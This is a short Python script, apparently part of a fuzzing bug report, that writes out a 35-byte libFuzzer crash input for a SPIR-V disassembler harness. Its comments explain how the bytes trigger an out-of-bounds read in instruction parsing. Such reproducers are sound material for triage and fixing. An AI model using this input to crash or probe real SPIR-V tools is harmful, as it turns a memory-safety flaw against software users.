#!/usr/bin/env python3
# generate_poc.py - rematerialize the 35-byte libFuzzer crash input for the
# spirv_dis_extended_options harness (crash-731164ad5b65f4770c63c264368682163f).
#
# This is the ORIGINAL libFuzzer wire input the built harness consumes. The
# harness uses FuzzedDataProvider: ConsumeIntegral<uint8_t>() reads three
# option bytes from the END of the buffer (env, extended, legacy), then
# ConsumeRemainingBytes() takes the leading 32 bytes (8 words) as the SPIR-V
# stream. For this input the trailing bytes are 0x78 0xff 0x7f:
#   legacy_byte  = 0x78 -> bit 0x40 set -> FRIENDLY_NAMES
#   extended_byte= 0xff -> bit 0x08 set -> HANDLE_UNKNOWN_OPCODES
# i.e. exactly the two option bits the OpTypePointer OOB-read needs. The leading
# word stream carries the short-encoded OpTypePointer with an out-of-range
# StorageClass that forces the emitAsUnknown retry, so ParseInstruction is
# dispatched with num_words==3 and reads inst.words[3] past the buffer.
#
# (A separate 32-byte stripped word stream is what the public-API Path-B repro
# repro.cc consumes instead of a FuzzedDataProvider; see NOTES.md.)
poc = bytes([
    0x03, 0x02, 0x23, 0x07, 0x00, 0x03, 0x01, 0x00,
    0x00, 0x10, 0x8d, 0x6c, 0x36, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x08, 0x64, 0x20, 0x00, 0x03, 0x00,
    0x97, 0x00, 0xff, 0x31, 0x03, 0x00, 0xdd, 0x2d,
    0x78, 0xff, 0x7f,
])
open("poc.bin", "wb").write(poc)
print(f"wrote poc.bin ({len(poc)} bytes)")
